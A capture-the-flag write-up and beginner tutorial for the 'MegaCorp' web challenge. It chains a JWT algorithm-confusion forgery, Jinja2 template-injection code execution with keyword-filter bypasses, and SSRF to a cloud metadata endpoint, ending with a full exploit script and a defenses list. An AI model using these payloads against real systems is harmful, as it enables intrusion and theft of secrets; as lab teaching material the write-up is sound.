#🏢 MegaCorp CTF Writeup

**Challenge:** MegaCorp | **Points:** 482 | **Author:** benzo  
**Flag:** `EH4X{14mk1nd4high}`  
**Category:** Web | **Difficulty:** Medium-Hard

---

## 🧠 Overview

This challenge is a multi-stage web exploitation chain involving:

1. **Reconnaissance** — Finding hidden endpoints
2. **Credential Discovery** — Default credentials login
3. **JWT Algorithm Confusion** — RS256 → HS256 forgery
4. **SSTI (Server-Side Template Injection)** — WAF bypass via hex encoding
5. **SSRF (Server-Side Request Forgery)** — AWS metadata endpoint access

---

## 🔍 Stage 1 — Reconnaissance

### What is Recon?

Recon (reconnaissance) means mapping out the target before attacking. We look for hidden pages, technology stack, and any exposed information.

### Step 1.1 — Directory Fuzzing with ffuf

**ffuf** (Fuzz Faster U Fool) is a tool that tries many URL paths to find hidden endpoints.

```bash
ffuf -u http://chall.ehax.in:7801/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403 -fc 404
```

**Results:**

```
login   [Status: 200]   ← Login page
profile [Status: 302]   ← Redirects to login (needs auth)
fetch   [Status: 403]   ← Forbidden but EXISTS
```

> 💡 **Beginner Tip:** A 403 is NOT the same as 404. 403 = "you don't have permission" which means the page EXISTS. 404 = "doesn't exist".

### Step 1.2 — Reading Page Source

Always read the HTML source of every page (`Ctrl+U` in browser or `curl`).

```bash
curl http://chall.ehax.in:7801/login
```

**Found in source:**

```html
<!-- hint: did you check for sql injection? just kidding, there is none here -->
v2.4.1 (build 8bd92)
```

> 💡 **Beginner Tip:** Developers often leave comments in HTML with hints, credentials, or version info. ALWAYS read the source.

### Step 1.3 — Finding the Public Key

```bash
# Try common key endpoints
curl http://chall.ehax.in:7801/pubkey       # ← 200 OK!
curl http://chall.ehax.in:7801/.well-known/jwks.json  # 404
curl http://chall.ehax.in:7801/public.pem   # 404
```

**Result:** `/pubkey` returns the RSA public key!

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsNmqnDkCDNBFWmWQ3ZsA
...
-----END PUBLIC KEY-----
```

---

## 🔐 Stage 2 — Login (Credential Discovery)

### What are we looking for?

We need to login to the "Employee Authentication Portal" using Corporate ID + Passcode.

### Step 2.1 — Try Default Credentials

The login page showed `alice` as a placeholder in the Corporate ID field. Try common passwords:

```bash
curl -c cookies.txt -X POST http://chall.ehax.in:7801/login \
  -d "corporate_id=alice&passcode=password123"
```

**Result:** 302 redirect to `/profile` = **SUCCESS!** 🎉

We also received a JWT token in the cookie:

```
Set-Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ...
```

### Step 2.2 — Decode the JWT

Go to **jwt.io** or decode manually:

```bash
# The middle part (payload) is base64 encoded
echo "eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ" | base64 -d
```

**Decoded payload:**

```json
{
  "username": "alice",
  "role": "user"
}
```

> 💡 **Beginner Tip:** JWT (JSON Web Token) has 3 parts separated by dots: `header.payload.signature`. The header and payload are just base64 encoded — anyone can read them. The signature prevents tampering... unless the server is misconfigured.

---

## 🔑 Stage 3 — JWT Algorithm Confusion Attack

### What is JWT Algorithm Confusion?

The server uses **RS256** (asymmetric — uses private key to sign, public key to verify).

**The vulnerability:** Some servers accept **HS256** (symmetric — uses ONE key for both signing AND verifying). If we sign a forged token with HS256 using the **public key as the secret**, a vulnerable server will verify it with the same public key — and accept it!

```
Normal RS256:  Sign with PRIVATE key → Verify with PUBLIC key
Attack HS256:  Sign with PUBLIC key  → Server verifies with PUBLIC key ✓ (confused!)
```

### Step 3.1 — Install jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install termcolor cprint pycryptodomex requests ratelimit --break-system-packages
```

### Step 3.2 — Save the Public Key

```bash
cat > pubkey.pem << 'EOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsNmqnDkCDNBFWmWQ3ZsA
aYELW0TM1Ea746JjjojY8jq4psXnI00XOIjBI+q1xg0JYfpa6+m/zp4ZzeEw3/GX
gCKGacUAGCpSejVbj0wG0AdqtX5N6lumw4MEcPIpynzsEhZ+M/zPEJopLoL7sHNH
BMDlMcWQZmbmWA1895iWbIqpOpY8kUHorNsqUdxvQIH8/8aMj/b6Kbc3Ihau6NKi
AqMxnvRzLW2xO8t4dPaTTqI9Gt9igAFfZSJA6E89wKXp6vk/G9RzV8K5qLH16QR3
wcoFvcKSedA89l0iws7VRxN4khbvP6/4RZg3KyEbE0IhO/vqvg2lBYb8A9AnE6D6
hQIDAQAB
-----END PUBLIC KEY-----
EOF
```

### Step 3.3 — Forge Admin JWT

```bash
ALICE="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ..."

python3 jwt_tool.py $ALICE -X k -pk pubkey.pem -I -pc role -pv admin -pc username -pv admin
```

**Flags explained:**

- `-X k` = key confusion attack
- `-pk pubkey.pem` = use this public key as HMAC secret
- `-I` = inject/modify claims
- `-pc role -pv admin` = set claim "role" to "admin"
- `-pc username -pv admin` = set claim "username" to "admin"

**Output (forged admin token):**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0...
```

### Step 3.4 — Verify Admin Access

```bash
ADMIN_TOKEN="<forged_token>"

curl -sb "token=$ADMIN_TOKEN" http://chall.ehax.in:7801/profile | grep "user-tag"
# Should now show: admin (not employee_tier_1)
```

---

## 💉 Stage 4 — SSTI (Server-Side Template Injection)

### What is SSTI?

The profile page has a **bio textarea** that gets **rendered by the server**. If user input is passed directly into a Jinja2 template without sanitization, we can inject template expressions that execute on the server.

```
Normal:  bio = "Hello World"  → displays "Hello World"
SSTI:    bio = "{{7*7}}"      → displays "49" (server evaluated it!)
```

### Step 4.1 — Confirm SSTI (as admin)

The source code hint said: _"HTML rendering is disabled for Tier 1 employees"_ — meaning it's ENABLED for admins!

Submit `{{7*7}}` as bio → Preview → see `49` → **SSTI confirmed!**

### Step 4.2 — WAF Bypass

The server has a WAF (Web Application Firewall) that blocks keywords like `os`, `popen`, `__class__`, etc.

```
Input: {{config.__class__.__init__.__globals__["os"].popen("id").read()}}
Output: "Malicious input detected! Access Blocked."
```

**Bypass using hex encoding:** `\x6f\x73` = `os`, `\x70\x6f\x70\x65\x6e` = `popen`

```python
# In ASCII:
# o = \x6f
# s = \x73  
# p = \x70
# o = \x6f
# p = \x70
# e = \x65
# n = \x6e
```

### Step 4.3 — RCE via SSTI

```bash
ADMIN_TOKEN="<forged_token>"

# List root directory
curl -sb "token=$ADMIN_TOKEN" -X POST http://chall.ehax.in:7801/profile \
  --data-urlencode "bio={{cycler.__init__.__globals__['\x6f\x73']['\x70\x6f\x70\x65\x6e']('ls /').read()}}"
```

**Output:**

```
app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

We have **Remote Code Execution (RCE)**! 🔥

### Step 4.4 — Read the Source Code

```bash
# List /app directory
curl -sb "token=$ADMIN_TOKEN" -X POST http://chall.ehax.in:7801/profile \
  --data-urlencode "bio={{cycler.__init__.__globals__['\x6f\x73']['\x70\x6f\x70\x65\x6e']('ls /app').read()}}"
```

**Output:** `README.md app.py requirements.txt solution.py templates`

```bash
# Read solution.py - the intended exploit script!
curl -sb "token=$ADMIN_TOKEN" -X POST http://chall.ehax.in:7801/profile \
  --data-urlencode "bio={{cycler.__init__.__globals__['\x6f\x73']['\x70\x6f\x70\x65\x6e']('cat /app/solution.py').read()}}"
```

This revealed the full exploit chain including the API_KEY leak method!

### Step 4.5 — Leak the API Key

From solution.py we learned the API key is in an environment variable:

```bash
curl -sb "token=$ADMIN_TOKEN" -X POST http://chall.ehax.in:7801/profile \
  --data-urlencode "bio={{cycler.__init__.__globals__['o'+'s'].environ['API_KEY']}}"
```

**Result:** `s3cr3t_fetch_k3y_for_adm1ns_only`

> 💡 **Why `'o'+'s'` instead of hex?** String concatenation also bypasses the WAF since it doesn't contain the literal string `os`.

---

## 🌐 Stage 5 — SSRF (Server-Side Request Forgery)

### What is SSRF?

SSRF tricks the **server** into making HTTP requests on our behalf. This lets us access internal services that are not accessible from the internet.

The `/fetch` endpoint makes HTTP requests to URLs we provide. The server runs on AWS, so we can target the **AWS metadata endpoint** (`169.254.169.254`) which is only accessible from inside the cloud environment.

### Step 5.1 — Use /fetch with API Key

```bash
curl -b "token=$ADMIN_TOKEN" -X POST http://chall.ehax.in:7801/fetch \
  -d "url=http://169.254.169.254/latest/meta-data/flag&api_key=s3cr3t_fetch_k3y_for_adm1ns_only"
```

**Result:** 🚩 **`EH4X{14mk1nd4high}`**

---

## 📋 Complete Automated Exploit Script

```python
import requests
import json
import base64
import hmac
import hashlib

BASE_URL = "http://chall.ehax.in:7801"

# Step 1: Get public key
pubkey = requests.get(f"{BASE_URL}/pubkey").content
print(f"[+] Got public key")

# Step 2: Forge admin JWT (RS256 -> HS256 confusion)
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
).decode().rstrip('=')

payload = base64.urlsafe_b64encode(
    json.dumps({"username": "admin", "role": "admin"}).encode()
).decode().rstrip('=')

msg = f"{header}.{payload}".encode()
sig = base64.urlsafe_b64encode(
    hmac.new(pubkey, msg, hashlib.sha256).digest()
).decode().rstrip('=')

admin_token = f"{header}.{payload}.{sig}"
cookies = {'token': admin_token}
print(f"[+] Forged admin token")

# Step 3: SSTI to leak API_KEY (WAF bypass via string concat)
ssti = "{{ cycler.__init__.__globals__['o'+'s'].environ['API_KEY'] }}"
res = requests.post(f"{BASE_URL}/profile", data={'bio': ssti}, cookies=cookies)
# Parse API key from bio-display div
import re
api_key = re.search(r'bio-display">(.*?)</div>', res.text).group(1).strip()
print(f"[+] API Key: {api_key}")

# Step 4: SSRF via /fetch to AWS metadata
res = requests.post(f"{BASE_URL}/fetch",
    data={'url': 'http://169.254.169.254/latest/meta-data/flag', 'api_key': api_key},
    cookies=cookies)
print(f"[+] FLAG: {re.search(r'EH4X{.*?}', res.text).group()}")
```

---

## 🗺️ Attack Chain Diagram

```
[Login: alice:password123]
         ↓
[Valid RS256 JWT (role: user)]
         ↓
[/pubkey → RSA Public Key]
         ↓
[JWT Confusion: HS256 signed with pubkey as secret]
         ↓
[Admin JWT (role: admin)]
         ↓
[POST /profile bio → SSTI (Jinja2)]
         ↓
[WAF bypass: \x6f\x73 hex / 'o'+'s' concat]
         ↓
[cycler.__init__.__globals__['os'].environ['API_KEY']]
         ↓
[API Key: s3cr3t_fetch_k3y_for_adm1ns_only]
         ↓
[POST /fetch?url=http://169.254.169.254/latest/meta-data/flag]
         ↓
[🚩 EH4X{14mk1nd4high}]
```

---

## 📚 Key Concepts Learned

|Concept|What it is|Tool Used|
|---|---|---|
|Directory Fuzzing|Finding hidden URLs|ffuf|
|JWT Decoding|Reading token claims|jwt.io / base64|
|JWT Algorithm Confusion|Forging tokens by confusing RS256/HS256|jwt_tool|
|SSTI|Injecting code into server templates|Manual / curl|
|WAF Bypass|Evading keyword filters|Hex encoding / string concat|
|SSRF|Making server fetch internal resources|curl|
|AWS Metadata|Cloud instance internal data service|169.254.169.254|

---

## 🛡️ Defenses (How to Prevent This)

1. **JWT:** Explicitly specify allowed algorithms — never accept `none` or algorithm switching
2. **SSTI:** Never pass user input directly to `render_template_string()` — use template variables properly
3. **WAF:** Blacklists are bypassable — use allowlists and sandbox template rendering
4. **SSRF:** Validate and restrict URLs — block private IP ranges (127.x, 169.254.x, 10.x, 192.168.x)
5. **Credentials:** Never use `password123` — enforce strong password policies
6. **API Keys:** Never store secrets in environment variables accessible via SSTI

---

_Writeup by: [your name] | Challenge by: benzo @ EHAX CTF 2026_